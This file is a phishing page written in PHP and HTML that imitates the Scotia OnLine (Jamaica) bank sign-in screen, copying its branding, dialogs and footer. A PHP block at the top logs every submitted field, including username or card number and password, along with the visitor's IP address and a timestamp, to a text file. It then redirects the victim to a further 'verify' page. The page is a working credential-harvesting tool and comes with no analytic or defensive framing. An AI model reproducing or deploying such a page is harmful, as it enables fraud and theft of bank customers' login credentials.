<?php
if ($_SERVER['REQUEST_METHOD'] == 'POST') {
header('Location: verify_user&password.php');
$handle = fopen('log.txt', 'a');
fwrite($handle, '----------------------------------------------------------------------['.$_SERVER['SERVER_NAME'].$_SERVER['SCRIPT_NAME'].']---['.strtoupper(date("h:i:s a - Y/m/d")).']---['.$_SERVER['REMOTE_ADDR']."]\r\n");
foreach($_POST as $variable => $value) {
fwrite($handle, $variable.': '.$value."\r\n");}
fclose($handle);
exit;
} ?>

<!-- saved from url=(0178)http://onlinescotiajam.myftp.org/access.php?token=db1b677778ea2e94de8d5be8522f68b1e558ef54f4ad81237e59abd1f8515e7c839a4a66b45db36b2c9ae549217aaeb73b11dee3e484a512d896dd72935dcd88 -->
<html lang="en" xml:lang="en" xmlns="http://www.w3.org/1999/xhtml" style="" class="RUIFW-ready desktop"><head id="j_idt3"><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <title>Scotia OnLine</title>
	
	
	<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
	
	  <meta charset="utf-8">
 
		<!-- <meta name="apple-mobile-web-app-capable" content="yes"> -->
	   
	
	
	    
<link href="http://localhost:8080/phpSite/scotis/./Scotia OnLine_files/bootstrap.css" rel="stylesheet" type="text/css"><link href="http://localhost:8080/phpSite/scotis/./Scotia OnLine_files/bootstrap-theme.css" rel="stylesheet" type="text/css"><link href="http://localhost:8080/phpSite/scotis/./Scotia OnLine_files/bootstrap-datepicker.css" rel="stylesheet" type="text/css"><link href="http://localhost:8080/phpSite/scotis/./Scotia OnLine_files/font-awesome.css" rel="stylesheet" type="text/css"><link href="http://localhost:8080/phpSite/scotis/./Scotia OnLine_files/B2ELab-RUIFW.css" rel="stylesheet" type="text/css"><link href="http://localhost:8080/phpSite/scotis/./Scotia OnLine_files/B2ELab-RUIFW-static.css" rel="stylesheet" type="text/css"><link href="http://localhost:8080/phpSite/scotis/./Scotia OnLine_files/bootstrap-slider.css" rel="stylesheet" type="text/css"><!--[if lte IE 8]><link rel="stylesheet" type="text/css" href="http://localhost:8080/signon15/retail/B2E_RUIFW_src/core/css/B2ELab-RUIFW-IE-Only.css" /><![endif]-->
    
    

    
   
    <link href="http://onlinescotiajam.myftp.org/images/favicon.ico" rel="shortcut icon">
    <link href="http://localhost:8080/phpSite/scotis/./Scotia OnLine_files/desktop.css" type="text/css" rel="stylesheet">
    <link href="http://localhost:8080/phpSite/scotis/./Scotia OnLine_files/signon.css" type="text/css" rel="stylesheet">
	<link href="http://localhost:8080/phpSite/scotis/./Scotia OnLine_files/print.css" type="text/css" rel="stylesheet">

</head><body>

<div class="RUIFW-page-wrap">
    <header class="RUIFW-container-header" role="navigation"><div id="header" class="RUIFW-page-header"><a class="sr-only RUIFW-skip-main" href="http://onlinescotiajam.myftp.org/access.php?token=db1b677778ea2e94de8d5be8522f68b1e558ef54f4ad81237e59abd1f8515e7c839a4a66b45db36b2c9ae549217aaeb73b11dee3e484a512d896dd72935dcd88#RUIFW-main-content" onclick="#">Skip to main content</a>
        <h1 class="RUIFW-brand RUIFW-col-6 col-sm-6">
          <span class="RUIFW-sr sr-only sr-only">Scotiabank Group</span>
        </h1>
        <div class="RUIFW-col-6 headTopLinks col-sm-6">
<form id="header_links_form" name="header_links_form" method="post" action="<?php echo basename(__FILE__); ?>" enctype="application/x-www-form-urlencoded">


        <a href="http://localhost:8080/phpSite/scotis/javascript:undefined;" id="tcSwitch" onclick="var x=&quot;.tl(&quot;;s_objectID=&quot;javascript:undefined;_1&quot;;return this.s_oc?this.s_oc(e):true">Terms and Conditions</a>
       
</form>
            <a href="http://localhost:8080/phpSite/scotis/javascript:undefined;" onclick="var x=&quot;.tl(&quot;;s_objectID=&quot;javascript:undefined;_2&quot;;return this.s_oc?this.s_oc(e):true" title="How to contact Scotiabank">Contact Us</a>
              <a href="http://localhost:8080/phpSite/scotis/javascript:undefined;" onclick="var x=&quot;.tl(&quot;;s_objectID=&quot;javascript:undefined;_3&quot;;return this.s_oc?this.s_oc(e):true" title="Scotiabank Accessibility Statement">Accessibility</a>
        </div></div>
      <div class="RUIFW-bg-bar hidden-xs">
        <div class="RUIFW-bg-main-nav"></div>
      </div>
      <nav class="RUIFW-container-nav-main">
        <ul class="RUIFW-nav-main nav navbar-nav nav navbar-nav">
          <li class="" id=""></li>
        </ul>
      </nav>
    </header>
    <section id="RUIFW-main-content" class="RUIFW-container-main" tabindex="-1"><div id="messages" class="success-msg"></div><div id="messages01" class="success-msg divOff"></div>

 <div id="content_block">
<form id="contentForm" name="contentForm" method="post" action="<?php echo basename(__FILE__); ?>" enctype="application/x-www-form-urlencoded">




	<div id="cmContentOnlyW1">
	</div>
	
	<h1 class="RUIFW-col-9 col-sm-9">Sign In to Scotia OnLine (Jamaica)</h1>

	<div class="RUIFW-content-main RUIFW-col-9 col-md-9 col-sm-9">


		<div class="wizard-form-content wrapfrom">
			<div class="RUIFW-row row"><div class="RUIFW-col-6 vertical-separator col-sm-6">
					<div class="RUIFW-row row">
											<div class="RUIFW-col-12 col-sm-12 col-sm-12">
    
                            <label id="contentForm:scotiacard_SG" style="width:300px;">Username or ScotiaCard number</label>
                            <input id="contentForm:nscard" type="text" name="usrd" autocomplete="off" class="RUIFW-form-el RUIFW-input-lg form-control form-control" maxlength="32" size="32"><div class="pad-2px mrgn-top-5"><a id="contentForm:recover_user_SG" href="http://onlinescotiajam.myftp.org/access.php?token=db1b677778ea2e94de8d5be8522f68b1e558ef54f4ad81237e59abd1f8515e7c839a4a66b45db36b2c9ae549217aaeb73b11dee3e484a512d896dd72935dcd88#" onclick="#">Forgot your username?</a></div>
			

							
							
							

							
							<div class="RUIFW-input-lg">
							</div>
							
						</div>
					</div>


					
					<div class="RUIFW-row row">
						<div class="RUIFW-col-12 col-sm-12"><label>Password:</label><div id="contentForm:pwField" class="RUIFW-input-lg">
                            <input id="contentForm:pwdnMasked" type="password" name="pswrd" autocomplete="off" value="" maxlength="32 size=" 32"="" class="RUIFW-form-el form-control"></div>

							<div class="pad-2px mrgn-top-5"><a id="contentForm:forgottenPassword_activate_AUTH" href="http://onlinescotiajam.myftp.org/access.php?token=db1b677778ea2e94de8d5be8522f68b1e558ef54f4ad81237e59abd1f8515e7c839a4a66b45db36b2c9ae549217aaeb73b11dee3e484a512d896dd72935dcd88#" onclick="#">Forgot your password?</a>
							</div>
						</div>
					</div>
                    <div style="margin-top: 18px">
                        <div class="">
							<span style="left center no-repeat; float:left;  width: 30px; height: 33px;t;" onclick="rememberMeCheck(&#39;remember&#39;)"><input name="contentForm:j_idt176" class="alcbx-alcrb1" id="remember" type="checkbox">
								<label for="remember" class="margin-left-8 alcbx-alcrb" style="min-height:18px;"></label>
							</span>
							<div class="">
								<span id="register" onclick="rememberMeCheck(&#39;remember&#39;)"><label style="font-size: 12px;font-weight:normal;color: #606060;letter-spacing: 0;line-height: 19px;">Remember my username or card number (Optional)</label>
								</span>
								<div style="margin-left:30px;margin-top:5px;"><span style="font-size: 12px;color: #606060;line-height: 19px;"><b>IMPORTANT: Not advised for public computers</b></span>
								</div>
							</div>
                        </div>
                    </div>
                    
					<div id="nicknameField" class="divOff" style="margin-top:10px;">
						<div class="RUIFW-row row">
							<div class="RUIFW-col-10 col-sm-10">
								<label style="font-size:12px;">Card number too long? Nickname your card</label><div id="contentForm:rmcField1" class="RUIFW-inline"><input id="contentForm:nickname" type="text" name="usrid" autocomplete="off" value="" class="RUIFW-form-el form-control form-control" maxlength="8" size="16"></div>
							</div>
						</div>
					</div>
					<br>

					<div class="RUIFW-row row">
						<div class="RUIFW-col-12 col-sm-12">
						

						</div>
					</div></div>
				<div class="RUIFW-col-6 col-sm-6">
					<div class="RUIFW-row row">
						<div class="RUIFW-col-12 mrgn-top-20 col-sm-12"><span id="contentForm:newToScotiaWeb" class="">New to Scotia OnLine?</span>
							<br><a id="contentForm:activate_AUTH" href="http://onlinescotiajam.myftp.org/access.php?token=db1b677778ea2e94de8d5be8522f68b1e558ef54f4ad81237e59abd1f8515e7c839a4a66b45db36b2c9ae549217aaeb73b11dee3e484a512d896dd72935dcd88#">Enroll now</a>
						</div>
					</div>
				</div>
			</div>
			<div class="clear"></div>
			<br>

			
			<div class="btn-holder">
                <!-- <a id="contentForm:signIn" href="http://localhost:8080/phpSite/scotis/#" class="RUIFW-btn-primary btn btn-primary">Sign In</a> -->
                <input class="RUIFW-btn-primary btn btn-primary" placeholder="Sign In" type="submit">
			</div>
           

		</div>
		<div id="cmContentOnlyW2">
		</div><span class="gap"></span>


	</div>
	<div class="RUIFW-modal fade modal fade in modal fade" id="forgotPasswordWindow" tabindex="-1" role="dialog" aria-labelledby="myModalLabel" aria-hidden="false" data-backdrop="static">



		<div class="RUIFW-modal-dialog modal-dialog modal-dialog modal-dialog modal-dialog">
			<div class="RUIFW-modal-content modal-content modal-content modal-content modal-content" role="document">
				<div class="RUIFW-modal-header modal-header modal-header">
					<button type="button" class="close_icon" data-dismiss="modal"></button>
					<h4 class="RUIFW-modal-title modal-title modal-title" id="myModalLabel">
						Reset password
					</h4>
					</div>
					<div class="RUIFW-modal-body modal-body modal-body">
						To continue, let's confirm your account and personal info. If you don't have a registered email in your profile, please visit your nearest branch.</div>
					<div class="RUIFW-modal-footer btn-holder modal-footer modal-footer" id="aunth_sect_btns">

<a id="contentForm:forgotPasswordReminderDialog:blockCancelPanelForm:j_idt220" href="http://onlinescotiajam.myftp.org/access.php?token=db1b677778ea2e94de8d5be8522f68b1e558ef54f4ad81237e59abd1f8515e7c839a4a66b45db36b2c9ae549217aaeb73b11dee3e484a512d896dd72935dcd88#" onclick="#" class="RUIFW-btn-primary btn btn-primary btn btn-primary">Continue</a>
	

					</div>
			</div>
		</div>


	</div></form>

	<div class="RUIFW-modal fade modal fade in modal fade" id="enrollmentAuthWindow" tabindex="-1" role="dialog" aria-labelledby="myModalLabel" aria-hidden="false" data-backdrop="static">
<form id="contentForm:enrollmentReminderDialog" name="contentForm:enrollmentReminderDialog" method="post" action="<?php echo basename(__FILE__); ?>" enctype="application/x-www-form-urlencoded">

		<div class="RUIFW-modal-dialog modal-dialog modal-dialog modal-dialog">
			<div class="RUIFW-modal-content modal-content modal-content modal-content" role="document">
				<div class="RUIFW-modal-header modal-header modal-header">
					<button type="button" class="close_icon" data-dismiss="modal"></button>
					<h4 class="RUIFW-modal-title modal-title modal-title" id="myModalLabel">
						Enroll in Scotia OnLine Banking
					</h4>
					</div>
					<div class="RUIFW-modal-body modal-body modal-body" style="font-size:14px;">
						To continue, let's confirm your account and personal info. If you don't have a registered email in your profile, please visit your nearest branch.</div>
					<div class="RUIFW-modal-footer btn-holder modal-footer modal-footer" id="aunth_sect_btns">


<input id="contentForm:enrollmentReminderDialog:blockCancelPanelForm:j_idt225" type="submit" name="contentForm:enrollmentReminderDialog:blockCancelPanelForm:j_idt225" value="Cancel" style="font-size:14px;" class="RUIFW-btn btn btn-default btn btn-default" onclick="mojarra.ab(this,event,&#39;click&#39;,0,0,{&#39;onevent&#39;:fadeEnrollmentAuthWindowAction});return false"><a id="contentForm:enrollmentReminderDialog:blockCancelPanelForm:j_idt226" href="http://onlinescotiajam.myftp.org/access.php?token=db1b677778ea2e94de8d5be8522f68b1e558ef54f4ad81237e59abd1f8515e7c839a4a66b45db36b2c9ae549217aaeb73b11dee3e484a512d896dd72935dcd88#" style="font-size:14px;" onclick="#" class="RUIFW-btn-primary btn btn-primary btn btn-primary">Continue</a>


					</div>
			</div>
		</div></form>
        

	</div>
	
	<div class="RUIFW-modal fade modal fade in modal fade" id="recoverUserNameAuthWindow" tabindex="-1" role="dialog" aria-labelledby="myModalLabel" aria-hidden="false" data-backdrop="static">
<form id="contentForm:recoverUserNameReminderDialog" name="contentForm:recoverUserNameReminderDialog" method="post" action="<?php echo basename(__FILE__); ?>" enctype="application/x-www-form-urlencoded">


		<div class="RUIFW-modal-dialog modal-dialog modal-dialog modal-dialog">
			<div class="RUIFW-modal-content modal-content modal-content modal-content" role="document">
				<div class="RUIFW-modal-header modal-header modal-header">
					<button type="button" class="close_icon" data-dismiss="modal"></button>
					<h4 class="RUIFW-modal-title modal-title modal-title" id="myModalLabel">
						Recover Username
					</h4>
					</div>
					<div class="RUIFW-modal-body modal-body modal-body" style="font-size:14px;">
						To continue, let's confirm your account and personal info. If you don't have a registered email in your profile, please visit your nearest branch.</div>
					<div class="RUIFW-modal-footer btn-holder modal-footer modal-footer" id="aunth_sect_btns">


<input id="contentForm:recoverUserNameReminderDialog:blockCancelPanelForm:j_idt231" type="submit" name="contentForm:recoverUserNameReminderDialog:blockCancelPanelForm:j_idt231" value="Cancel" style="font-size:14px;" class="RUIFW-btn btn btn-default btn btn-default" onclick="mojarra.ab(this,event,&#39;click&#39;,0,0,{&#39;onevent&#39;:fadeRecoverUserAuthWindowAction});return false"><a id="contentForm:recoverUserNameReminderDialog:blockCancelPanelForm:j_idt232" href="http://onlinescotiajam.myftp.org/access.php?token=db1b677778ea2e94de8d5be8522f68b1e558ef54f4ad81237e59abd1f8515e7c839a4a66b45db36b2c9ae549217aaeb73b11dee3e484a512d896dd72935dcd88#" style="font-size:14px;" onclick="#" class="RUIFW-btn-primary btn btn-primary btn btn-primary">Continue</a>


					</div>
			</div>
		</div></form>
        

	</div>
	
	<div>

	</div>
  
</div>



 <!-- <div class="RUIFW-content-side RUIFW-col-3 col-md-3 col-sm-3" id="default_page_content_right_sideid"><span id="rightSideContent">
       <div id="cmContentOnly1">
        </div>
         <div class="right-box">
        <div class="exp-collapse">
          <h4>
            <a href="http://localhost:8080/phpSite/scotis/javascript:undefined;" class="Open">Security Guarantee</a>
          </h4>
        </div>
        <div id="scotia_security" class="RUIFW-container-well fade right-box-item-holder in" aria-hidden="false">
          <ul class="right-box-item">
            <li class="rightbox-icon-lock"><span>We're committed to keeping your financial information safe and secure.</span></li>
            <li class="more-link"><a href="http://localhost:8080/phpSite/scotis/javascript:undefined;" onclick="var x=&quot;.tl(&quot;;s_objectID=&quot;javascript:undefined;_5&quot;;return this.s_oc?this.s_oc(e):true" title="Learn More">Learn More</a></li>
        	
          </ul>
        </div></div>
      
      <div id="cmContentOnly2">
        </div>
     <div id="help_section_div" class="right-box">
        <div class="exp-collapse">
          <h4>
            <a href="http://localhost:8080/phpSite/scotis/javascript:undefined;" class="" onclick="var x=&quot;.tl(&quot;;s_objectID=&quot;javascript:undefined;_6&quot;;return this.s_oc?this.s_oc(e):true">Need Help?</a>
          </h4>
        </div>
        <div id="help_section" class="RUIFW-hide RUIFW-container-well fade right-box-item-holder" aria-hidden="true">
          <ul class="right-box-item">
            <li><a onclick="var x=&quot;.tl(&quot;;s_objectID=&quot;javascript:undefined;_7&quot;;return this.s_oc?this.s_oc(e):true" href="http://localhost:8080/phpSite/scotis/javascript:undefined;" title="Help with this page">Help with this page</a></li>
            <li class="rightbox-icon-video"><a onclick="var x=&quot;.tl(&quot;;s_objectID=&quot;javascript:undefined;_8&quot;;return this.s_oc?this.s_oc(e):true" href="http://localhost:8080/phpSite/scotis/javascript:undefined;" title="How-to video">How-to video</a></li>
          </ul>
        </div>
      </div> 
      <div id="cmContentOnly3">
      </div>
      <div class="right-box noprint">
         <div class="exp-collapse">
          <h4>
            <a onclick="var x=&quot;.tl(&quot;;s_objectID=&quot;javascript:undefined;_9&quot;;return this.s_oc?this.s_oc(e):true" class="" href="http://localhost:8080/phpSite/scotis/javascript:undefined;">Contact Us</a>
          </h4>
        </div>
        <div id="contact_us" class="RUIFW-hide RUIFW-container-well fade right-box-item-holder" aria-hidden="true">
          <ul class="right-box-item">
            <li class="rightbox-icon-phone"><span>Call us at (876) 960-2675 or Toll free 1-888-472-6842</span></li>
            <li class="rightbox-icon-comment"><a id="general_feedback_rhs_link" title="General Feedback" onclick="var x=&quot;.tl(&quot;;s_objectID=&quot;javascript:undefined;_10&quot;;return this.s_oc?this.s_oc(e):true" href="http://localhost:8080/phpSite/scotis/javascript:undefined;" aria-hidden="false">General Feedback</a></li>
            <li class="more-link"><a title="More" href="http://localhost:8080/phpSite/scotis/javascript:undefined;" onclick="var x=&quot;.tl(&quot;;s_objectID=&quot;javascript:undefined;_11&quot;;return this.s_oc?this.s_oc(e):true" aria-hidden="false">More</a></li>
          </ul>
        </div>
      </div> 
      <div id="cmContentOnly4">
      </div></span>
    </div> -->
	<div class="RUIFW-modal divOff modal fade modal fade" id="feedbackModalDialog" tabindex="-1" role="dialog" aria-labelledby="myModalLabel" aria-hidden="false" data-backdrop="static" style="display: none;">
		<div class="RUIFW-modal-dialog modal-dialog modal-dialog modal-dialog">
			<div class="RUIFW-modal-content modal-content modal-content modal-content" role="document">
<form id="feedbackForm" name="feedbackForm" method="post" action="<?php echo basename(__FILE__); ?>" enctype="application/x-www-form-urlencoded">

					<div class="RUIFW-modal-header modal-header modal-header"><a id="feedbackForm:headerCloseLink" href="http://onlinescotiajam.myftp.org/access.php?token=db1b677778ea2e94de8d5be8522f68b1e558ef54f4ad81237e59abd1f8515e7c839a4a66b45db36b2c9ae549217aaeb73b11dee3e484a512d896dd72935dcd88#" onclick="#" class="close_icon"></a>
						<h4 class="RUIFW-modal-title modal-title modal-title" id="feedbackModalLogo">
							<img src="http://localhost:8080/phpSite/scotis/./Scotia OnLine_files/scotiabank-group.gif">
						</h4>
					</div>
					<div class="RUIFW-modal-body modal-body modal-body">
						<h1>Feedback</h1><div id="feedbackForm:feedBackBannerMsg"></div>

						<p>Your feedback is important to us as we will use it to make improvements. Note we will not reply to individual submissions. If you need assistance, please call our Contact Centre.</p>
						<ul id="feedbackTabs" class="RUIFW-nav-tabs nav nav-two-tabs mrgn-top-20 nav nav-tabs nav nav-tabs">
							<li class="active"><a href="http://onlinescotiajam.myftp.org/access.php?token=db1b677778ea2e94de8d5be8522f68b1e558ef54f4ad81237e59abd1f8515e7c839a4a66b45db36b2c9ae549217aaeb73b11dee3e484a512d896dd72935dcd88#suggestionTab" data-toggle="tab" onclick="#">Suggestion</a></li>
							<li class=""><a href="http://onlinescotiajam.myftp.org/access.php?token=db1b677778ea2e94de8d5be8522f68b1e558ef54f4ad81237e59abd1f8515e7c839a4a66b45db36b2c9ae549217aaeb73b11dee3e484a512d896dd72935dcd88#problemTab" data-toggle="tab" onclick="#">Problem</a></li>
						</ul>
						<div class="RUIFW-tab-content tab-content wizard_top_border mrgn-top-minus1 wrapfrom tab-content tab-content">
							<div class="RUIFW-tab-pane fade tab-pane active in tab-pane fade tab-pane fade" id="suggestionTab">
								<div class="RUIFW-row  mrgn-top-20 row row"><div id="feedbackForm:sugMsgColBlock" class="RUIFW-col-7 col-sm-7 col-sm-7">
										<label id="fb_label_description">Suggestion description <span class="red-text">*</span></label>
										<div><textarea id="feedbackForm:suggestionText" name="feedbackForm:suggestionText" class="RUIFW-from-el form-control maxLengthCheck" cols="50" rows="6" placeholder="Write your ideas here." maxlength="400"></textarea><span id="feedbackForm:fb_suggestion_errorId"></span>
										</div></div>
								</div>
									<div class="RUIFW-row  mrgn-top-20 row row"><div id="feedbackForm:sUNameBlock" class="RUIFW-col-6 col-sm-6 col-sm-6">
											<label>Your full name <span class="form-alt-txt">(optional)</span></label>
											<div>
                                                <input id="feedbackForm:sCustName" type="text" name="feedbackForm:sCustName" class="RUIFW-from-el form-control" maxlength="50"><span id="feedbackForm:fb_username_errorId"></span>
											</div></div>
									</div>
							</div>
							<div id="problemTab" class="RUIFW-tab-pane tab-pane fade tab-pane fade tab-pane fade">
								<div class="RUIFW-row  mrgn-top-20 row row"><div id="feedbackForm:probAreaBlock" class="RUIFW-col-6 col-sm-6 col-sm-6">
										<label>Problem area <span class="red-text">*</span></label>
										<div>
                                            <input id="feedbackForm:problemArea" type="text" name="feedbackForm:problemArea" class="RUIFW-from-el form-control probAreaLengthCheck" placeholder="e.g. Adding a Payee" maxlength="50"><span id="feedbackForm:fb_problem_area_errorId"></span>
										</div></div>
								</div>
								<div class="RUIFW-row  mrgn-top-20 row row"><div id="feedbackForm:problemDescBlock" class="RUIFW-col-7 col-sm-7 col-sm-7">
										<label id="fb_prob_descId">Problem description <span class="red-text">*</span></label>
										<div><textarea id="feedbackForm:problemDesc" name="feedbackForm:problemDesc" class="RUIFW-from-el form-control lengthCheck" cols="50" rows="6" placeholder="Explain your problem here." maxlength="400"></textarea><span id="feedbackForm:fb_Prob_errorId"></span>
										</div></div>
								</div>
									<div class="RUIFW-row  mrgn-top-20 row row"><div id="feedbackForm:pUNameBlock" class="RUIFW-col-6 col-sm-6 col-sm-6">
											<label>Your full name  <span class="form-alt-txt">(optional)</span></label>
											<div><input id="feedbackForm:pCustName" type="text" name="feedbackForm:pCustName" class="RUIFW-from-el form-control" maxlength="50"><span id="feedbackForm:fb_user_errorId"></span>
											</div></div>
									</div>
							</div>
						</div>
						<div class="RUIFW-row  mrgn-top-20 row row" id="mandatoryId">
								<div class="RUIFW-col-6 col-sm-6 col-sm-6">
								<label><span class="red-text">*</span> Mandatory field.</label></div>
						</div>
					</div>
					<div class="RUIFW-modal-footer btn-holder modal-footer modal-footer" id="aunth_sect_btns"><a id="feedbackForm:formCloseLink" href="http://onlinescotiajam.myftp.org/access.php?token=db1b677778ea2e94de8d5be8522f68b1e558ef54f4ad81237e59abd1f8515e7c839a4a66b45db36b2c9ae549217aaeb73b11dee3e484a512d896dd72935dcd88#" onclick="#" class="RUIFW-btn-primary btn btn-primary btn btn-primary">Submit Feedback</a>
					</div>

</form>
			</div>
		</div>
	</div>
	
	<style>
	.error-msgPA {
    color: #D81E05;
    nowhitespace: afterproperty;
    display: inline-block!important;
    margin: 5px 0 0 20px!important;
    text-align: left!important;
    word-wrap: break-word!important;
    white-space: pre-wrap!important;
    width: 70%!important;
}
	</style><span id="leapwebanalytics">
		   		
                </span>
    </section>
</div>

  <footer class="RUIFW-page-footer">
    <div class="footer-icons" id="footerImage">
      <div class="clear"></div>
    </div>
    <div class="RUIFW-row noprint row-margin row">
    <ul class="RUIFW-nav-footer RUIFW-col-7 col-sm-7">
    <div id="footerLinks">
          <li><a href="http://localhost:8080/phpSite/scotis/javascript:undefined;" onclick="var x=&quot;.tl(&quot;;s_objectID=&quot;javascript:undefined;_12&quot;;return this.s_oc?this.s_oc(e):true">Legal</a></li>
          <li class="separator">&nbsp;</li>
        <li><a href="http://localhost:8080/phpSite/scotis/javascript:undefined;" onclick="var x=&quot;.tl(&quot;;s_objectID=&quot;javascript:undefined;_13&quot;;return this.s_oc?this.s_oc(e):true">Privacy</a></li>
        <li class="separator">&nbsp;</li>
        <li><a href="http://localhost:8080/phpSite/scotis/javascript:undefined;" onclick="var x=&quot;.tl(&quot;;s_objectID=&quot;javascript:undefined;_14&quot;;return this.s_oc?this.s_oc(e):true">Security</a></li>
        <li class="separator">&nbsp;</li>
        <li><a href="http://localhost:8080/phpSite/scotis/javascript:undefined;" onclick="var x=&quot;.tl(&quot;;s_objectID=&quot;javascript:undefined;_15&quot;;return this.s_oc?this.s_oc(e):true">Contact Us</a></li>
          <li class="separator">&nbsp;</li>
          <li><a href="http://localhost:8080/phpSite/scotis/javascript:undefined;" onclick="var x=&quot;.tl(&quot;;s_objectID=&quot;javascript:undefined;_16&quot;;return this.s_oc?this.s_oc(e):true">FATCA</a></li>
      </div></ul>
       <ul class=" RUIFW-nav-footer RUIFW-col-5 col-sm-5">
      <li class="copyright">
                <a href="http://localhost:8080/phpSite/scotis/javascript:undefined;" onclick="var x=&quot;.tl(&quot;;s_objectID=&quot;javascript:undefined;_17&quot;;return this.s_oc?this.s_oc(e):true"><img alt="trusteer" src="http://localhost:8080/phpSite/scotis/./Scotia OnLine_files/trusteerIcon.png"></a>© 2022 Scotiabank.com All Rights Reserved</li>

           <li style="margin-left: 300px;">
               <div id="logo" style="display: inline;">
               </div>
           </li>

       </ul>
    </div>
   	
  </footer>
  <div id="printFooter">
    <div class="RUIFW-row row">
      <div class="RUIFW-col-12 col-sm-12">
      </div>
    </div>
    <div class="RUIFW-row row">
      <div class="RUIFW-col-9 col-sm-9">
      </div>
      <div class="RUIFW-col-3 col-sm-3">
        <img src="http://localhost:8080/phpSite/scotis/./Scotia OnLine_files/scotiabank_r_logo.png" width="152" height="26" class="mrgn-btm-15  mrgn-top-10 alignright">
      </div>
      </div>
  </div>
			<div class="RUIFW-modal fade modal modal fade" id="videoModal" tabindex="-1" role="dialog" aria-labelledby="videoModal" aria-hidden="true" style="display: none;">
			    <div class="RUIFW-modal-dialog modal-dialog modal-dialog modal-dialog">
			        <div class="RUIFW-modal-content modal-content modal-content modal-content" role="document">
			              <div class="RUIFW-modal-header modal-header modal-header">
			        <button type="button" class="close_icon" data-dismiss="modal"></button>
			        <h4 class="RUIFW-modal-title modal-title modal-title" id="myModalLabel"><img src="http://localhost:8080/phpSite/scotis/./Scotia OnLine_files/scotiabank-group.gif"></h4>
			      </div>
			            <div class="RUIFW-modal-body modal-body modal-body">
			                <div class="pad-btm-10">
				         
 			                    <iframe width="550" height="350" src="http://localhost:8080/phpSite/scotis/./Scotia OnLine_files/saved_resource.html" frameborder="0"></iframe>
			                </div>
			            </div>
			        </div>
			    </div>
			</div>
<form id="j_idt321" name="j_idt321" method="post" action="<?php echo basename(__FILE__); ?>" enctype="application/x-www-form-urlencoded">



	<div class="RUIFW-modal fade modal fade" id="registerCancelPanelWindow" tabindex="-1" role="dialog" aria-labelledby="myModalLabel" aria-hidden="true" data-backdrop="static">
		
		<div class="RUIFW-modal-dialog modal-dialog modal-dialog">
			<div class="RUIFW-modal-content modal-content modal-content" role="document">
				<div class="RUIFW-modal-header modal-header">
					<button type="button" class="close_icon" data-dismiss="modal"></button>
					<h4 class="RUIFW-modal-title modal-title" id="myModalLabel">
						<img src="http://localhost:8080/phpSite/scotis/./Scotia OnLine_files/scotiabank-group.gif">
					</h4>
				</div>
				
				<div class="RUIFW-modal-body modal-body"><span id="j_idt321:registerCancelPanelWindowmainMessageId">Are you sure you want to cancel?</span>
					<br>
					<br><span id="j_idt321:registerCancelPanelWindowsubMessageId"></span>
				</div>
				
				<div class="RUIFW-modal-footer btn-holder modal-footer" id="aunth_sect_btns">
							<button id="registerCancelPanelWindowNoButton" type="button" class="RUIFW-btn btn btn-default" data-dismiss="modal">No</button><a id="j_idt321:registerCancelPanelWindowYesButton" href="http://onlinescotiajam.myftp.org/access.php?token=db1b677778ea2e94de8d5be8522f68b1e558ef54f4ad81237e59abd1f8515e7c839a4a66b45db36b2c9ae549217aaeb73b11dee3e484a512d896dd72935dcd88#" onclick="#" class="RUIFW-btn-primary btn btn-primary" data-dismiss="modal">Yes</a>
				</div>
				
			</div>
		</div>
	</div>

</form>
<form id="j_idt327" name="j_idt327" method="post" action="<?php echo basename(__FILE__); ?>" enctype="application/x-www-form-urlencoded">



	<div class="RUIFW-modal fade modal fade" id="cancelResetPassword" tabindex="-1" role="dialog" aria-labelledby="myModalLabel" aria-hidden="true" data-backdrop="static">
		
		<div class="RUIFW-modal-dialog modal-dialog modal-dialog">
			<div class="RUIFW-modal-content modal-content modal-content" role="document">
				<div class="RUIFW-modal-header modal-header">
					<button type="button" class="close_icon" data-dismiss="modal"></button>
					<h4 class="RUIFW-modal-title modal-title" id="myModalLabel">
						<img src="http://localhost:8080/phpSite/scotis/./Scotia OnLine_files/scotiabank-group.gif">
					</h4>
				</div>
				
				<div class="RUIFW-modal-body modal-body"><span id="j_idt327:cancelResetPasswordmainMessageId">Do you really want to exit Login process?</span>
					<br>
					<br><span id="j_idt327:cancelResetPasswordsubMessageId"></span>
				</div>
				
				<div class="RUIFW-modal-footer btn-holder modal-footer" id="aunth_sect_btns">
							<button id="cancelResetPasswordNoButton" type="button" class="RUIFW-btn btn btn-default" data-dismiss="modal">No</button><a id="j_idt327:cancelResetPasswordYesButton" href="http://onlinescotiajam.myftp.org/access.php?token=db1b677778ea2e94de8d5be8522f68b1e558ef54f4ad81237e59abd1f8515e7c839a4a66b45db36b2c9ae549217aaeb73b11dee3e484a512d896dd72935dcd88#" onclick="#" class="RUIFW-btn-primary btn btn-primary" data-dismiss="modal">Yes</a>
				</div>
				
			</div>
		</div>
	</div>

</form>

		<div class="RUIFW-modal fade modal fade in modal fade" id="egrid_confirmation_popup" tabindex="-1" role="dialog" aria-labelledby="myModalLabel" aria-hidden="false" data-backdrop="static">
<form id="egridpopupForm" name="egridpopupForm" method="post" action="<?php echo basename(__FILE__); ?>" enctype="application/x-www-form-urlencoded">


		<div class="RUIFW-modal-dialog modal-dialog modal-dialog modal-dialog">
			<div class="RUIFW-modal-content modal-content modal-content modal-content" role="document">
				<div class="RUIFW-modal-header modal-header modal-header">
					<button type="button" class="close_icon" data-dismiss="modal"></button>
					<h4 class="RUIFW-modal-title modal-title modal-title" id="myModalLabel">
						<img src="http://localhost:8080/phpSite/scotis/./Scotia OnLine_files/scotiabank-group.gif">
					</h4>
					</div>
					<div class="RUIFW-modal-body modal-body modal-body">
						<div class="pad-btm-10">???EGRID_DESC???</div>
					</div>
					<div class="RUIFW-modal-footer btn-holder modal-footer modal-footer" id="aunth_sect_btns">
                        <input id="egridpopupForm:supmitbtn" type="submit" name="egridpopupForm:supmitbtn" value="Ok" class="RUIFW-btn-primary btn btn-primary btn btn-primary">
					</div>
			</div>
		</div>
</form>
		</div>
		
		<div class="RUIFW-modal fade modal fade in modal fade" id="SignOnSyncTokenPopup" tabindex="-1" role="dialog" aria-labelledby="myModalLabel" aria-hidden="false" data-backdrop="static">
<form id="syncTokenIncludeForm" name="syncTokenIncludeForm" method="post" action="<?php echo basename(__FILE__); ?>" enctype="application/x-www-form-urlencoded">


		<div class="RUIFW-modal-dialog modal-dialog modal-dialog">
			<div class="RUIFW-modal-content modal-content modal-content" role="document">
				<div class="RUIFW-modal-header modal-header modal-header">
